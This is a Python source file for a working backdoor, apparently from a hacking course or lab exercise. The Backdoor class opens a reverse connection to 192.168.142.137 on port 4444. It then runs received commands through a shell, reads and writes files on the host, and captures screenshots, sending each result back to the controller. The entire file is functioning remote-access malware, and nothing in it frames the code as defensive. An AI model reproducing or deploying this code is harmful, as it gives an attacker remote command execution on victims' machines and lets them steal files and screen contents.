import socket
import subprocess
import json
import os
import base64

import pyautogui


class Backdoor:
    def __init__(self, host, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    @staticmethod
    def change_working_dir_to(path):
        os.chdir(path)
        return f"[+] Working directory changed. Current: {os.getcwd()}"

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-] Error with using command! Check correct!"

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    @staticmethod
    def write_file(path, data):
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))
            return "[+] Upload successful"

    @staticmethod
    def make_screen():
        screen = pyautogui.screenshot()
        screen.save("screen.png")
        with open("screen.png", "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":
                    break
                elif command[0] == "cd":
                    result = self.change_working_dir_to(command[1])
                elif command[0] == "download":
                    if ':' in command[1]:
                        result = self.read_file(command[1])
                    else:
                        result = self.read_file(os.getcwd() + '/' + command[1])
                elif command[0] == "screen":
                    result = self.make_screen()
                elif command[0] == "upload":
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_system_command(command)
            except Exception:
                result = "[-] Error with using command! Check correct!"
            try:
                self.reliable_send(result.decode('cp866'))
            except AttributeError:
                self.reliable_send(result)
        self.connection.close()
        exit()


def main(name):
    backdoor = Backdoor("192.168.142.137", 4444)
    backdoor.run()


if __name__ == '__main__':
    main('PyCharm')
